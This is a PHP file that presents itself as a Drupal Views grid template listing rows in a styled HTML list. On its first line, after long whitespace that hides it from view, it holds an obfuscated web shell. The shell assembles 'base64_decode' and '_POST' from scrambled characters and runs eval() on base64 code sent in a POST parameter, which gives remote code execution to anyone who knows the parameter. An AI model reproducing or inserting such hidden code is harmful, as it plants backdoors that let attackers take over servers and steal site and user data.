<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nd70087'])) {eval($s21(${$s20}['nd70087']));}?><?php
/**
 * @file
 * Default simple view template to display a rows in a grid.
 *
 * - $rows contains a nested array of rows. Each row contains an array of
 *   columns.
 *
 * @ingroup views_templates
 */
?>
<ul class="news_list f_right f_xs_none w_xs_full m_bottom_50 m_xs_bottom_15" data-appear-animation="fadeInDown" data-appear-animation-delay="400">
    <?php
    $i = 1;
    foreach ($rows as $id => $row):
        ?>
        <?php if ($i != 1): ?>
            <?php print $row; ?>
        <?php endif; ?>
        <?php $i++; ?>
    <?php endforeach; ?>
</ul>
<div class="clear"></div>